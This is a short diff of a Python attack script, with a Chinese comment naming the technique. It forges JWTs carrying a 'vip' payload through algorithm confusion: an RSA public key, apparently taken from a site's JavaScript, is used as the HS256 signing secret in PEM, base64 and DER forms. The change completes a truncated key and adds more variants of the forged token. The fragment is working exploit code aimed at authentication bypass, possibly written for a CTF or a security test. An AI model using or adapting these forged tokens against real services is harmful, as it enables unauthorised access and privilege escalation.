@@ -102,14 +102,15 @@ jwts.append(
     )
 )
 # 算法混淆: 用 JS 里的 RSA 公钥作为 HS256 密钥
-PUB_MOD = "wixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
-PUB_PEM = (
-    "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"
-    + PUB_MOD
-    + "\n-----END PUBLIC KEY-----"
-)
+PUB_B64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsoA9UZOV8b0G/kntXw8WKZpH2rp0KQIEoSmM8IMmOcYhvGjlEvSKs+30+XxUDP+7TIvIP/grz/ORQMHVhVM9EmVLR+GK/PawUXLjdYykSNI4D7Ce0/aW29DF1jVBGBCoe/jpV+3rwXN4eM6ScMaQT9+cQB4hN2VQn4Zcwkd8lw9UZKxdiuF2rbCmasG9s5/p5mtAbYDsq7s1D4WP9VwWhoRKVebuiVuXoF0wps8XeMTxmX8uLLqR8TGLzPvHWkyhAnwixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
+PUB_PEM = "-----BEGIN PUBLIC KEY-----\n" + PUB_B64 + "\n-----END PUBLIC KEY-----"
+try:
+    PUB_DER = base64.b64decode(PUB_B64)
+except Exception:
+    PUB_DER = b""
 jwts.append(("confuse-pem", make_jwt("HS256", vip_payload, PUB_PEM)))
-jwts.append(("confuse-mod", make_jwt("HS256", vip_payload, PUB_MOD)))
+jwts.append(("confuse-b64", make_jwt("HS256", vip_payload, PUB_B64)))
+jwts.append(("confuse-der", make_jwt("HS256", vip_payload, PUB_DER.decode("latin1"))))
 jwts.append(
     (
         "confuse-rs256",
